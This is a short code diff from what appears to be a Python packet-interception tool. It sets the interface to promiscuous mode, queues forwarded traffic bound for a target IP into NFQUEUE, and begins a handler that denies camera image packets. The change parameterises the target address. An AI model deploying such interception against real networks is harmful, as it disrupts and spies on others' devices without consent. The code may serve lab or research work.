@@ -5,9 +5,11 @@ import sys
 import os
 import time
 
+masterIP = "192.168.1.241"
+
 print "\n[*] Redirect traffic to the NFQUEUE... \n"
 os.system("ip link set dev enp0s3 promisc on")
-os.system("iptables -A FORWARD -p tcp --tcp-flags ALL PSH,ACK -d 192.168.1.164 -j NFQUEUE --queue-num 1")
+os.system("iptables -A FORWARD -p tcp --tcp-flags ALL PSH,ACK -d "+masterIP+" -j NFQUEUE --queue-num 1")
 
 def deny_camera_image(pkt):
     packet = IP(pkt.get_payload())
